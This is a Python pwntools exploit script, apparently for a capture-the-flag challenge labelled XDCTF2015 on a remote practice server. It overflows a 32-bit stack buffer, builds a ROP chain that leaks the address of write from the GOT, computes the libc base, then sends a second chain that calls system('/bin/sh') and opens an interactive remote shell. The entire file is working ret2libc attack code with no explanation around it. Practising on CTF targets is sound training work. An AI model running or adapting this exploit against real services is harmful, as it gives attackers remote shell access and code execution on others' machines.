from pwn import *
from LibcSearcher import *

import utils

context.arch = 'i386'
context.log_level = 'debug'

elf = ELF('../bof')
libc = ELF('/home/kali/glibc-all-in-one/libs/2.23-i386/libc-2.23.so')

target = remote('node4.buuoj.cn', 27745)

write_plt = elf.plt['write']
write_got = elf.got['write']
main = elf.sym['main']

args = {0x1: [], write_got: [], 0x4: []}
payload = utils.create_rop_payload(
  0x6c, args,'i386', write_plt, fake_return_addrress=main)

target.sendlineafter('XDCTF2015~!\n', payload)
write_addr = u32(target.recv(4))
libc.address = write_addr - libc.sym['write']
system = libc.sym['system']
shell = next(libc.search(b'/bin/sh'))

test = LibcSearcher('write', write_addr)
test.dump('system')

payload = utils.create_rop_payload(0x6c, {shell: []}, 'i386', system)
target.sendlineafter('XDCTF2015~!\n', payload)
target.interactive()